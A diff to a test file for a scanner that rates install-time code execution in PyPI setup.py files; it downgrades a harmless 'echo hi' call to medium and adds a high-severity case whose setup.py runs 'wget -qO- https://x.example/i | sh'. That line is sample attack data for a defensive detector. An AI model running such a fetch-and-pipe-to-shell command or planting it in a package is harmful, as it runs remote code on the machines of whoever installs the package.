@@ -243,12 +243,17 @@ async def test_fetch_pypi_wheel_when_no_sdist():
 
 # ── setup.py install-time exec (AST) ──────────────────────────────────────────
 
-def test_setup_py_os_system_is_high():
+def test_setup_py_os_system_is_an_install_hook():
+    # Precision PR 2: a literal, payload-free shell command at install time is a medium
+    # install hook; one that downloads / pipes to a shell stays high.
     src = "import os\nfrom setuptools import setup\nos.system('echo hi')\nsetup(name='x')\n"
     findings = detect_pypi_install_exec(src, "setup.py")
     assert len(findings) == 1
     assert findings[0].category == "install_hook"
-    assert findings[0].severity == "high"
+    assert findings[0].severity == "medium"
+    src = ("import os\nfrom setuptools import setup\n"
+           "os.system('wget -qO- https://x.example/i | sh')\nsetup(name='x')\n")
+    assert detect_pypi_install_exec(src, "setup.py")[0].severity == "high"
 
 
 def test_setup_py_network_plus_exec_is_critical():
